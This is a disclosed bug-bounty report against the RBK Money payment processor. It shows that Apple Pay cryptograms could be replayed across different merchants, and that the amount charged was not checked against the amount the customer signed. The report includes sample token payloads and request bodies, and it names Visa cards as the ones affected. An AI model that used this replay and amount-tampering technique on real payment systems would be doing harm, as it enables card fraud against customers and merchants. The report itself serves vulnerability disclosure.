# Apple Pay cryptogram replay and amount tampering

## Report Details
- **Report ID**: 996540
- **URL**: https://hackerone.com/reports/996540
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-10-02T13:48:17.021Z
- **Disclosed**: 2021-03-10T18:56:58.264Z

## Reporter
- **Username**: timyun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rbkmoney

## Vulnerability Information
During Apple Pay in-app or on-site payments the device generates a payment cryptogram, which contains a transaction ID, encrypted payment data, etc.

This is an example of the cryptogram which the phone passes to the internet acquiring service on api.transferwise.com:

```
"token": {
				"paymentData": {
					"version": "EC_v1",
					"data": "tJ*",
					"signature": "MIAGC*",
					"header": {
						"ephemeralPublicKey": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEPU54D0AnTNCE/rA/99aMiu10cCzW9mnA1xqhaV+pUY3cQ9oYHrtO6uXf24VrDxAwMgNeJOduroEtgAt7IAMrPA==",
						"publicKeyHash": "iGhC/O768cuRV11jvaEac1ytv9zCtsFfK6yxDzcEorI=",
						"transactionId": "fe573e4aaebd7b76e80032c0708624a108622d7f3d31389101a6ba059653a4f4"
					}
				}
```
                
Data field contains encrypted onlinePaymentCryptogram which represents "Online payment cryptogram, as defined by 3-D Secure."

Apple also requires to "Inspect the CMS signing time of the signature, as defined by section 11.3 of RFC 5652. If the time signature and the transaction time differ by more than a few minutes, it's possible that the token is a replay attack."

This is all described in:
https://developer.apple.com/library/archive/documentation/PassKit/Reference/PaymentTokenJSON/PaymentTokenJSON.html

The attack is possible due to the lack of checks during Apple Pay payments. The same cryptogram was used a few time within 24h, on the different stores (https://rbk.mn/D35rOlnep3f and https://fondchizhova.ru/node/729)

```
"token": {
				"paymentData": {
					"version": "EC_v1",
					"data": "hVr4d5Zjm5ot07QGEdKDsCW+olmb3szPC3xS4Gcjr1ulQzvefzElQYjvezCkBIvFtBFUQeOxtIy3ZQVf69nb0uJNLanZ9AFBfzN8xxy23QeCuFQWh0SkgUjc9/Lw1IRtGYrUJx2WeX+YtXP+/yzK8g0RDr1pvwHRKWOay64W+4DbemsWC8ShYk7mdfzge9urSwHeJfXK/y5hLdNvJkJfQvPu0cxkASZhVeSvz0/7ngKtnCP9DCIsIGhof+Nc30fCb4nA1asHelWOgXNKngeUYJi2gWX3bo8WcYf+65cWFjrWMro4bRzHh2VbRQpoULRjlqInPMel3ZhI3bhOVE4dVlbyLSsJYQcKwDLBSXybCsD591WAhaHdf9Wpxmb/rYSC6O55SqaBgT13MoH3xFH1O6ZRFzVjE8+2YVzZhsV9eyr/",
					"signature": "MIAGC",
					"header": {
						"ephemeralPublicKey": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEmLnyjZMabQOikn7jEKkc92SVvMNW2xJOZLyMVXUNs52so+U0LIZ7xRjYSq6eWwpcqvdR0wJSg22gB+gjfkhUhw==",
						"publicKeyHash": "iGhC/O768cuRV11jvaEac1ytv9zCtsFfK6yxDzcEorI=",
						"transactionId": "f376400ae00b9201fa45096ad1a80f048295d41f5c4c2f5c7e06fe88141f3543"
					}
				}
```
cryptogram was used to create 2 tokens for payments on 2
 different sites:

**date: Thu, 01 Oct 2020 10:30:34 GMT**

```
{"clientInfo":{"fingerprint":"a7e21773614841122f9f3203e8ea8432","ip":"92.40.171.45"},"paymentSession":"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjQwLjE3MS40NSJ9LCJwYXltZW50U2Vzc2lvbiI6IjdZYTRsdkZEYTE5emlldXh0bGFXWEEifQ","paymentToolDetails":{"cardNumberMask":"*3064","detailsType":"PaymentToolDetailsBankCard","last4":"3064","paymentSystem":"visa","tokenProvider":"applepay"},"paymentToolToken":"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..dxiUkBowKsMkyz3N71ECxA.5XActkAUb0MH-46pEb139iNHtKyx21OherM2vENcB7vFhL-BbwKLqelsvZ-b_7ydEwXeaYy3ZeN2ScHZ8k5pZffDwUS_QZ75_zOx2nKvaK54eBdkHwNtbqh5MvTIQJaUcgaff5ppc_HWLYSUQNywmeW0wsj5DDg5tnSVucPPR6uvycohIC9IgkdgglxgH9jhNvtsLasVfHcCruD9WgAlA7k4kFm4D5Vx3EsppzKY_UpvrZ--4zFGp9-dTxhbqT4N.3YFEzU4hG-3XLosxrJ7tag"}
```
and

**date: Thu, 01 Oct 2020 10:31:51 GMT**

```
{"clientInfo":{"fingerprint":"a7e21773614841122f9f3203e8ea8432","ip":"92.40.171.40"},"paymentSession":"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjQwLjE3MS40MCJ9LCJwYXltZW50U2Vzc2lvbiI6IjdRZ1NPMm14TzU1QkxRR3k0VTFtZ3AifQ","paymentToolDetails":{"cardNumberMask":"*3064","detailsType":"PaymentToolDetailsBankCard","last4":"3064","paymentSystem":"visa","tokenProvider":"applepay"},"paymentToolToken":"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..GUWDdl9N61xwMHavh1Ug3Q.3NnV7rSCeJ_XMRHje5bYbUEFbMZe3vUCueZa1dqL8WV1zJdJ1w2512MzvhwXEPNJbI5g0zsIt-YGD9TFeKO6ISqm0QZK1Gh41LahS-FItceLu7ZS-cpeGOrzYHeWjXo5gKLpuiMdefMz9xTp8HymGz8S_gQX8rsXevVJPYZPVNU7se536e-vTvePAdVR43lKWda2F_3GMwwZRI3YyhylkBo_Ff5fC9o0yuYYJZbbPD2H4c3kkw47bfh4xAeHZ3hx.OkcqSZfsg9npMMJvI-jo1g"}
```
and

**date: Thu, 01 Oct 2020 10:33:31 GMT**

```
{"clientInfo":{"fingerprint":"a7e21773614841122f9f3203e8ea8432","ip":"92.40.171.40"},"paymentSession":"eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjQwLjE3MS40MCJ9LCJwYXltZW50U2Vzc2lvbiI6IjRjdzF5Vm1GRjdjd1hOUmluV3F2ODEifQ","paymentToolDetails":{"cardNumberMask":"************3064","detailsType":"PaymentToolDetailsBankCard","last4":"3064","paymentSystem":"visa","tokenProvider":"applepay"},"paymentToolToken":"v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..jOVdbK-IGoMcZzTzo5FPnw.MgVNAkhBHHreNKKw7aaP19_pwDDaFvuYkAEZhiHdFzbTsDFbikNCnPoDeR2PRndAgBSKPYPC-JrUYzEj3jBjHu9_XbRhOL0wunTzXpCFWaoyWX9U4QkWyTAM-g6CIQU4eTzpLu7SJAAUU1KnUYyXOK6LMApxq3FN_s3T_5jnejBwWh2IHHPgiaUxMA7SCjb4XHV5RI3CBqXow6AHeEP4kvRjWFGv8nqrL3oWPkpBWUcOA_Ihe-P1AgZ82kUrUP66.w4cX0ohp96B776qws1yHAQ"}                
```

RBK Money also doesn't check what price has been shown on the Apple Pay payment sheet and has been signed by the customer, but only the price that is sent on the https://api.rbk.money/v2/processing/invoice-templates/[id]/invoices
request. So stolen cryptograms can be used for much larger/arbitrary payments.

```
{
	"clientInfo": {
		"fingerprint": "a7e21773614841122f9f3203e8ea8432",
		"ip": "92.237.66.14"
	},
	"paymentSession": "eyJjbGllbnRJbmZvIjp7ImZpbmdlcnByaW50IjoiYTdlMjE3NzM2MTQ4NDExMjJmOWYzMjAzZThlYTg0MzIiLCJpcCI6IjkyLjIzNy42Ni4xNCJ9LCJwYXltZW50U2Vzc2lvbiI6IjVSN2lKbkkxalAyc1g1eEhRdlBkQ20ifQ",
	"paymentToolDetails": {
		"cardNumberMask": "************8631",
		"detailsType": "PaymentToolDetailsBankCard",
		"last4": "8631",
		"paymentSystem": "mastercard",
		"tokenProvider": "applepay"
	},
	"paymentToolToken": "v1.eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIiwia2lkIjoia2kyMjQwNVN1MVNFTHdRcTBjT21MamVNTjY1OVl1Rk8ifQ..j1q3rFfHWzFtxDNzU1fBBA.6cszZeR2iDsUwz2--hBiR0Z_pK2gsOjd4dmTjssTkZZa6Lzz3gcjyFeSmzYsQgd2mqfAjvP4r_1gNsK1FQC4tAaGeAixJiLnWqjeY1-F_0wac5kyvWB70Q9ofjWvoo9no3Bwe21Utc42ByO9NJRHDk4H58AvfRbRZAA-z76zsFTyTK-eWQl06A3LR8gJIfgRWSBlRFye72UsKH7v2oLQNKSds9UamD_1tze0UN0srh2mGTA7m5raCUUnxL947W-Rhd7TOw.dzobn5l6XWSQX77A9WPiiw"
}
```
Has shown a 100,00 transaction, however it was used to sign a 110,00 payment.

To implement this attack, hackers can follow the e-skimming attacks similar to Magecart. After infecting user device (Macbook) or rbk.money resources, even the card is fully virtual and data is encrypted, it still can be used multiple times for committing fraud.

*Notice: the original research was presented in 2017 https://www.blackhat.com/docs/us-17/thursday/us-17-Yunusov-The-Future-Of-Applepwn-How-To-Save-Your-Money.pdf since that this attack is not possible with MC cards due to the fact that MC has necessary controls within their network to decline replay attacks. So this attack is possible only with Visa cards.*

## Impact

Stolen Apple Pay cryptogram can be used many times in the future for making fraudulent payments for any RBK Money merchant.

## Attachments
No attachments
